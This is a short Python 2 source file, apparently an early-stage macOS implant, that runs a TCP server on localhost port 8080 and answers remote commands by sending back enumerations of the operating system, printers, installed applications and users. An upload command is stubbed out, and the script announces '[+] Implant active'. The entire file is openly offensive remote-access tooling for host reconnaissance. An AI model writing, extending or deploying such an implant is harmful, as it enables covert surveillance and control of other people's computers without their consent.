import platform
import SocketServer

from os_types import macintosh

class ImplantHandler(SocketServer.BaseRequestHandler):

    def handle(self):
        while True:
            self.data = self.request.recv(1024).strip()
            
            if self.data == "enum_os":
                if platform.system() == 'Darwin':
                    self.request.sendall(macintosh.enum_os())
                    #use encoder first, then send request
            elif self.data == "enum_printers":
                if platform.system() == 'Darwin':
                    self.request.sendall(macintosh.enum_printers())
            elif self.data == "enum_applications":
                if platform.system() == 'Darwin':
                    self.request.sendall(macintosh.enum_applications())
            elif self.data == "enum_users":
                if platform.system() == 'Darwin':
                    self.request.sendall(macintosh.enum_users())
            elif self.data == 'upload':
                self.request.sendall("still working on")
            else:
                self.request.sendall("unknown command")

if __name__ == "__main__":
    HOST, PORT = "localhost", 8080

    print "[+] Implant active...Terminate w/ Ctrl-C\n"
    server = SocketServer.TCPServer((HOST, PORT), ImplantHandler)
    server.serve_forever()